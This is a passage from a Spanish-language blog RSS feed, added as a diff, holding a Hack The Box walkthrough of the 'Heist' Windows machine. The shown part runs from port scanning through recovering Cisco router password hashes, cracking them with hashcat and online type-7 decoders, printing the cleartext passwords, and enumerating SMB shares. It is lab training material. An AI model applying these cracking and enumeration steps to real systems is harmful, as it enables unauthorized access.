@@ -1,0 +1,506 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>winrm on sckull</title>
+    <link>https://sckull.github.io/tags/winrm/</link>
+    <description>Recent content in winrm on sckull</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es</language>
+    <copyright>©{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Sat, 30 Nov 2019 00:00:00 +0000</lastBuildDate>
+    <sy:updatePeriod>daily</sy:updatePeriod>
+    <sy:updateFrequency>daily</sy:updateFrequency>
+    
+        <atom:link href="https://sckull.github.io/tags/winrm/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+
+      
+      <item>
+        <title>Hack The Box - Heist</title>
+        <link>https://sckull.github.io/posts/heist/</link>
+        <pubDate>Sat, 30 Nov 2019 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 30 Nov 2019 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/heist/</guid>
+        <description>Heist es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Heist es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Nombre&lt;/th&gt;
+&lt;th&gt;Heist&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;OS&lt;/td&gt;
+&lt;td&gt;Windows&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;20&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Facil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;IP&lt;/td&gt;
+&lt;td&gt;10.10.10.149&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/8308&#34;&gt;MinatoTW&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;hr /&gt;
+&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos tcp/udp con masscan y nmap.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/heist# masscan -p1-65535,U:1-65535 10.10.10.149 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0
+
+Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-08-21 06:23:36 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+Discovered open port 49668/tcp on 10.10.10.149                                 
+Discovered open port 445/tcp on 10.10.10.149                                   
+Discovered open port 135/tcp on 10.10.10.149                                   
+Discovered open port 5985/tcp on 10.10.10.149                                  
+Discovered open port 80/tcp on 10.10.10.149
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Wed Aug 21 02:32:58 2019 as: nmap -sC -sV -p 49668,445,135,5985,80 -o nmap.scan 10.10.10.149&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.149
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.39s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-cookie-flags: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   /: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     PHPSESSID: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_      httponly flag not &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-title: Support Login Page
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Requested resource was login.php
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
+49668/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 32s, deviation: 0s, median: 32s
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2019-08-21 02:34:36
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug 21 02:34:42 2019 -- 1 IP address (1 host up) scanned in 103.97 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http---puerto-80&#34;&gt;HTTP - PUERTO 80&lt;/h2&gt;
+&lt;p&gt;Al visitar este puerto nos muestra un panel de inicio de sesion de una plataforma.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-21%2000.56.31.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Iniciamos sesion como invitado (Login as guest) y nos redirige a una nueva pagina &lt;code&gt;issues.php&lt;/code&gt; en la cual contiene un &lt;code&gt;chat&lt;/code&gt; de un cliente que muestra los errores que tuvo con su router cisco y una lista de errores dentro de un archivo.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-21%2000.45.35.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Archivo:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nx&#34;&gt;version&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;12.2&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;no&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pad&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;encryption&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;isdn&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;basic&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ess&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;hostname&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ios&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;security&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passwords&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;enable&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;secret&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pdQG$o8nrSzsGXeaduXrjlvKc91&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;rout3r&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;mo&#34;&gt;0242114&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;B0E143F015F5D1E161713&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;privilege&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;mo&#34;&gt;023750121&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;82&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;C1A1D751618034F36415408&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;authentication&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;retries&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;version&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;router&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;bgp&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;
+ &lt;span class=&#34;nx&#34;&gt;synchronization&lt;/span&gt;
+ &lt;span class=&#34;nx&#34;&gt;bgp&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;neighbor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;changes&lt;/span&gt;
+ &lt;span class=&#34;nx&#34;&gt;bgp&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dampening&lt;/span&gt;
+ &lt;span class=&#34;nx&#34;&gt;network&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Â&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mask&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;300.255&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;255.0&lt;/span&gt;
+ &lt;span class=&#34;nx&#34;&gt;timers&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;bgp&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;
+ &lt;span class=&#34;nx&#34;&gt;redistribute&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;connected&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;classless&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;route&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;access&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;permit&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;any&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;any&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;dialer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;protocol&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;no&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;server&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;no&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;server&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;vty&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
+ &lt;span class=&#34;nx&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;timeout&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;600&lt;/span&gt;
+ &lt;span class=&#34;nx&#34;&gt;authorization&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;SSH&lt;/span&gt;
+ &lt;span class=&#34;nx&#34;&gt;transport&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Encontramos dentro del archivo usuarios y contraseñas:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$1$pdQG$o8nrSzsGXeaduXrjlvKc91
+username rout3r password 7 0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;La primera contraseña la crackeamos con hashcat:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;stealth1agent:&lt;span class=&#34;nv&#34;&gt;$1$pdQG$o8nrSzsGXeaduXrjlvKc91&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Las dos ultimas utilizamos un script que nos devuelve el valor del hash, este hash es de tipo 7 de Cisco:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.question-defense.com/2011/08/17/perl-script-to-decode-cisco-type-7-password-hash&#34;&gt;&lt;strong&gt;Decode Cisco Password Hash&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;http://ibeast.com/tools/CiscoPassword/index.asp&#34;&gt;&lt;strong&gt;Cisco Password&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;http://www.ifm.net.nz/cookbooks/passwordcracker.html&#34;&gt;&lt;strong&gt;Password Cracker&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2000.22.34.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$uperP&lt;/span&gt;@ssword:0242114B0E143F015F5D1E161713
+Q4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;sJu&lt;span class=&#34;se&#34;&gt;\Y&lt;/span&gt;8qz*A3?d:02375012182C1A1D751618034F36415408
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;smbmap&#34;&gt;SMBMAP&lt;/h2&gt;
+&lt;p&gt;Ahora que tenemos usuairos y contraseñas intentamos listar sharenames, con el unico usuario con el cual nos dejó fue con el usuario &lt;strong&gt;hazard&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2015.41.00.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;impacket---lookupsid&#34;&gt;IMPACKET - LOOKUPSID&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/&#34;&gt;&lt;strong&gt;Impacket toolkit&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
